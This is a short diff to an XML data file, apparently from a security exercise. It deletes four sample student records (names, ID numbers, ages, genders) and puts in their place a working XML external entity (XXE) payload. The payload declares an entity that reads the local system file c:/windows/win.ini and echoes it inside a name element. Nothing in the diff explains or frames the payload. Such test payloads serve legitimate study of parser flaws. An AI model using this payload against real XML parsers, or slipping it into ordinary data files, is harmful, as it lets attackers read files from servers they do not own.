@@ -1,22 +1,7 @@
-<StuData>
-<student id="stu1" name="张三">
-   <id>08190001</id>
-   <age>20</age>
-   <gender>男</gender>
-</student>
-<student id="stu2" name="李四">
-   <id>08190002</id>
-   <age>21</age>
-   <gender>女</gender>
-</student>
-<student id="stu3" name="王五">
-   <id>08190011</id>
-   <age>19</age>
-   <gender>女</gender>
-</student>
-<student id="stu4" name="孙六">
-   <id>08190012</id>
-   <age>21</age>
-   <gender>男</gender>
-</student>
-</StuData>
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE xxe[
+<!ELEMENT name ANY>
+<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<root>
+<name>&xxe;</name>
+</root>
